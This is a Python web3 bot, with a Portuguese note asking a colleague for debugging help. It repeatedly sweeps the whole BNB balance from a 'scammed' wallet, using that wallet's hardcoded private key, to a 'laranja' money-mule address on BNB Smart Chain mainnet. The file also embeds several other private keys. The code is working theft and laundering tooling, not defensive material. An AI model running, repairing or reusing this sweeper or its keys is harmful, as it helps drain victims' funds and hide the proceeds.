
from tkinter import EXCEPTION
from web3 import HTTPProvider, Web3
from web3.middleware import geth_poa_middleware
from decimal import Decimal
import json
from time import sleep



'''
Fala, Thauan. Sou o programador que entrou na equipe do tom.
Nunca mexi com web3 ou coisa parecida, então ja deixo minhas desculpas pelo "go horse" em partes do codigo :(


Eu fiz o bot para tirar a quantia exata (desde que seja possivel com o minimo de gas) da conta, dessa quantia tirada 5 gwei de gas e puxamos
o restante para uma conta laranja.

Como voce tinha visto no código anterior ele funcionava(ainda funciona) sequencialmente em um unico loop saindo as transações em seguida.

Coloquei condicoes de "se conta tiver mais que 0.0001 faça transacao", para garantir que ele só tiraria quando tivesse algo. (menos que 0.0001 nao tem fracao pra gas).

porém estamos com o seguinte problema:

1 - Dado que ele já esteja rodando, ele nao tira todo o saldo. Tira apenas uma parte.
1.1 - Ele só tira tudo na primeira run do código (assim que chama .py)


Com o audio que voce enviou no sabado, eu tive a ideia de fazer a transacao dar um get_transaction e wait_for_transaction_receipt para pegar
o status da transacao e o nonce. Com isso eu alteraria a variavel status e pegaria o nonce da transacao que aconteceu com sucesso. Assim evitaria de ficar incrementando
indefinidamente o nonce mesmo que nao tenha sido feita com sucesso.

Entretanto nao funcionou, se comportou da mesma maneira....

Aí estou com uma intuição que isso deva ser feito com async function, para fazer a transacao e aguardar que a corotina espera_resposta retorne com os valores de status e nonce. 
Porém nao tenho muita experiencia com concorrencia e paralelismo, e estou vendo ainda como implementar

tentei fazer de forma padrao mas, como pode ver ao rodar esse codigo, nao funcionou...


A funcao revenge é o bot da forma inicial, pode chamar ela que ele vai se comportar da maneira que especifiquei

Já deixo meu agradecimento pela ajuda anterior e dessa.







'''
######### BNB REAL ##################
"""

my_address = '0x8D873Af746d58b3aE24E5D89228F2c297593c9E4'
address_scam = '0x308dC6D4671877ff4b4e5230121BBAF1c9ab03FA'
private_key_denis = 'cfdbccf01dcd5e8d70fb82d49770547276734f7574f427c23dca71c49dc619aa'
private_key_my = 'fe766585aa66ca3a8b3eaeba7ba040b3152616c7c5ff54e6008b81a0c94aeacc'
##################################################
"""

#headers
rpc_url = 'https://data-seed-prebsc-1-s1.binance.org:8545/'
rpc_url_real = 'https://bsc-dataseed.binance.org/'

#endereco do contrato da moeda alvo
contract_address_Lazy = '0xF718BDAE5f1630eEfbD454a4c7aeaCA1D7C85Bdc'

#chaves do bot
private_keyBot = 'fe766585aa66ca3a8b3eaeba7ba040b3152616c7c5ff54e6008b81a0c94aeacc'
pubkey_contaBot = '0x8D873Af746d58b3aE24E5D89228F2c297593c9E4'
address_bot = Web3.toChecksumAddress(pubkey_contaBot)

#chaves da scam
private_key_Scam = '59ed6e52a3fa8d021ed36b7fbf8ee7d50717629e682140ef8dbbd8ae11f65a38'
pubkey_contaScam = '0x6F1A1F5cfFed7f915e29E913e481a034BcA32f52'
address_scam = Web3.toChecksumAddress(pubkey_contaScam)
0x308dC6D4671877ff4b4e5230121BBAF1c9ab03FA
#conta laranja
pubkey_oran = '0xa576513b13A07B600017A36D516fFFa4FA746d35'
address_oran = Web3.toChecksumAddress(pubkey_oran)
private_key_laranja = 'a633779a203a94feb3c150634c8a564ca5b27bfa5cf94a72f3a60572bb6cedb1'
#iniciando conexao

#w3.middleware_onion.inject(geth_poa_middleware, layer=0)

#conectando no
while(True):
    try:
        print("[-] Conectando no...")
        w3 = Web3(Web3.HTTPProvider(rpc_url_real))
        connected = w3.isConnected()
        print("[-] Conexao bem sucedida!")
        break
    except Exception as es:
        print("[-] Erro de conexao: ", es)
        print("[-] Tentando nova conexao ...")
    

#pegando contrato da moeda em 
abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
contract = w3.eth.contract(address=contract_address_Lazy, abi=abi)

#pegando saldos
balanceOf = contract.functions.balanceOf(address_scam).call()
amount  = w3.fromWei(balanceOf,'ether')
print("SCAM bnb balance: ", w3.fromWei(w3.eth.get_balance(address_scam),'ether'))
print("Laranja bnb balance: ", w3.fromWei(w3.eth.get_balance(address_oran),'ether'))


print('######################')
#check se a conta scammada tem saldo bnb:

#nonces de cada transação

nonceBot_toScam = w3.eth.getTransactionCount(address_bot)
#nonceScam_toBot = w3.eth.getTransactionCount(address_scam)

#funcao para transferencia para conta externa. FuncionarIaa em paralelo
def transfer_to_orange(value, address_oran, nonce_toor):
    try:
        print("[-] Transferindo para conta externa ... hehehe")
        
        tx_bnb_to_oran = {
            'nonce':nonce_toor,
            'to': address_oran,
            'value': w3.toWei(value, 'ether'),     #ja aplicado .toWei
            'gas': 21000,
            'gasPrice': w3.toWei('68', 'gwei')
        }

        signed_tx_oran = w3.eth.account.signTransaction(tx_bnb_to_oran, private_keyBot)
        tx_oran_hash = w3.eth.sendRawTransaction(signed_tx_oran.rawTransaction)
        
        print("[-] Transferencia para conta externa bem sucedida!")
        print("[-] Repetindo o processo...")

    except Exception as e:
        print("[-] Falha na transferencia para conta externa....")
        print("[-] ERROR: ", e)

amount  = w3.toWei(balanceOf,'ether')
#gas_gwei = 0.000126

#ERA A FUNCAO INICIAL QUE FARIA AS TRANSAÇÕES
def revenge():
    nonceScam_toor = w3.eth.getTransactionCount(address_scam)
    status = 0
    #nonce_toor = w3.eth.getTransactionCount(address_bot)

    while(True):
        try:
            #sys.stdout.write("LENDO SALDO DAS CONTAS")
            #sys.stdout.write("[-] Saldo BNB Scammada:  %d   \n" % (w3.fromWei(w3.eth.get_balance(address_scam), 'ether')) )
            #sys.stdout.write("[-] Saldo BNB bot:  %d   \n" % (w3.fromWei(w3.eth.get_balance(address_bot), 'ether')) )
            #sys.stdout.write("[-] Saldo BNB laranja: %d   \n" % (w3.fromWei(w3.eth.get_balance(address_oran), 'ether')) )

            
            value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
            print("[-] LENDO SALDO DAS CONTAS")
            print("[-] Saldo BNB Scammada: ", value)
            #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
            print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
            
                
            if value > 0.0001 :

                print("[-] Tirando quantia... \n")

                #cabecalho de transacao minima de bnb
                
                #print("value: ", value)
                
                value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
                gas = float(21000*w3.fromWei(w3.toWei('6','gwei'), 'ether' ))
                value2 = float(value) - gas

                #print("value for transaction: ", value2)
                #print("gaaaas: ", gas)
                
                

                tx_bnb_to_bot = {
                    'nonce': nonceScam_toor,
                    'to': pubkey_oran,     #substitui o endereço do bot para o da conta laranja
                    'value': w3.toWei(Decimal(value2),'ether'),
                    'gas' : 21000,
                    'gasPrice': w3.toWei('6', 'gwei')
                }

                #print("estimate gas: ", w3.eth.estimate_gas(tx_bnb_to_bot))
                #puxando bnb da scammada
                print("[-] Enviando para terceira...\n")
                signed_tx_bnb = w3.eth.account.signTransaction(tx_bnb_to_bot, private_key_Scam)
                tx_bnb_hash = w3.eth.send_raw_transaction(signed_tx_bnb.rawTransaction)
                
                print("[-] Transferencia realizada com sucesso \n")
                #print("[-] LENDO SALDO DAS CONTAS")
                #print("[-] Saldo BNB Scammada: ", w3.fromWei(w3.eth.get_balance(address_scam), 'ether'))
                #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
                #print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
    

                #transfer_to_orange(0.001400,address_oran,nonce_toor)
                #print("[-] Buscando novas moedas disponiveis para transferencia...\n")
                #os.system('cls')
                #sys.stdout.flush()

                
                #nonce_toor += 1
            
        except Exception as e:
            print("Erro:", e)
            #os.system('cls')

            #sys.stdout.write("Erro: %s", (e))
        sleep(5)
        nonceScam_toor += 1



def sovem():
    nonceScam_toor = w3.eth.getTransactionCount(address_scam)
    #nonce_toor = w3.eth.getTransactionCount(address_bot)

    while(True):
        status = 0 #contrario de bem sucedida
        tx_bnb_hash = ''

        try:
            value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')

            #se a ultima transacao foi concluida e o saldo é maior que 0.0001 faz outra transacao para retirar tudo
            if status == 0 and value > 0.0001:

                print("[-] LENDO SALDO DAS CONTAS")
                print("[-] Saldo BNB Scammada: ", value)
                #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
                print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
                
                    
                print("[-] Tirando quantia... \n")

                #cabecalho de transacao minima de bnb
                
                #print("value: ", value)
                
                value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
                gas = float(21000*w3.fromWei(w3.toWei('5','gwei'), 'ether' ))
                value2 = float(value) - gas

                #print("value for transaction: ", value2)
                #print("gaaaas: ", gas)
                    
                    

                tx_bnb_to_bot = {
                    'nonce': nonceScam_toor,
                    'to': pubkey_oran,     #substitui o endereço do bot para o da conta laranja
                    'value': w3.toWei(Decimal(value2),'ether'),
                    'gas' : 21000,
                    'gasPrice': w3.toWei('5', 'gwei')
                }

                #print("estimate gas: ", w3.eth.estimate_gas(tx_bnb_to_bot))
                #puxando bnb da scammada

                print("[-] Enviando para terceira...\n")
                signed_tx_bnb = w3.eth.account.signTransaction(tx_bnb_to_bot, private_key_Scam)
                tx_bnb_hash = w3.eth.send_raw_transaction(signed_tx_bnb.rawTransaction)
                
                sleep(0.5)

                receipt = w3.eth.get_transaction(tx_bnb_hash)
                status = w3.eth.get_transaction_receipt(tx_bnb_hash)['status']
                #se a transacao foi adicionada no bloco e concluida status == 1
                if receipt != Exception and status == 1:
                    nonceScam_toor = receipt['nonce'] + 1
                    status = 0
                    print("[-] Transacao realizada com sucesso!\n")
                    print("[-] LENDO SALDO DAS CONTAS")
                    print("[-] Saldo BNB Scammada: ", value)
                    #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
                    print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
                    sleep(2)

        except Exception as e:
            print("[*****] Erro: ", e)
            continue        


def transacao(saldo, status, nonceScam_toor):
    tx_bnb_hash = ''

    try:
        value = saldo #w3.fromWei(w3.eth.get_balance(address_scam),'ether')

        #se a ultima transacao foi concluida e o saldo é maior que 0.0001 faz outra transacao para retirar tudo
        if status == 0 and value > 0.0001:

            print("[-] LENDO SALDO DAS CONTAS")
            print("[-] Saldo BNB Scammada: ", saldo)
            #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
            print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
            
                
            print("[-] Tirando quantia... \n")

            #cabecalho de transacao minima de bnb
            
            #print("value: ", value)
            
            value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
            gas = float(21000*w3.fromWei(w3.toWei('5','gwei'), 'ether' ))
            value2 = float(value) - gas

            #print("value for transaction: ", value2)
            #print("gaaaas: ", gas)
                
                

            tx_bnb_to_bot = {
                'nonce': nonceScam_toor,
                'to': pubkey_oran,     #substitui o endereço do bot para o da conta laranja
                'value': w3.toWei(Decimal(value2),'ether'),
                'gas' : 21000,
                'gasPrice': w3.toWei('5', 'gwei')
            }

            #print("estimate gas: ", w3.eth.estimate_gas(tx_bnb_to_bot))
            #puxando bnb da scammada

            print("[-] Enviando para terceira...\n")
            signed_tx_bnb = w3.eth.account.signTransaction(tx_bnb_to_bot, private_key_Scam)
            tx_bnb_hash = w3.eth.send_raw_transaction(signed_tx_bnb.rawTransaction)

            sleep(0.5)
            return tx_bnb_hash, nonceScam_toor

    except Exception as e:
        print("[*****] Erro: ", e)
        pass        


def espera_resposta(tx_hash,nonceScam_toor):
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    try:
        while receipt != None:
            status = w3.eth.get_transaction_receipt(tx_hash)['status']
            #se a transacao foi adicionada no bloco e concluida status == 1
            if receipt != Exception and status == 1:
                print("[-] Transacao realizada com sucesso!\n")
                nonceScam_toor = receipt['nonce'] + 1
                status = 0
                return status, nonceScam_toor
    except Exception as es:
        print("[+++++++] ERRO: ", es)
        
#sovem()


nonceScam_toor = w3.eth.getTransactionCount(address_scam)

while (True):
    saldo = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
    status = 0

    tx_hash, nonceScam_toor = transacao(saldo, status, nonceScam_toor)
    status, nonceScam_toor = espera_resposta(tx_hash, nonceScam_toor)

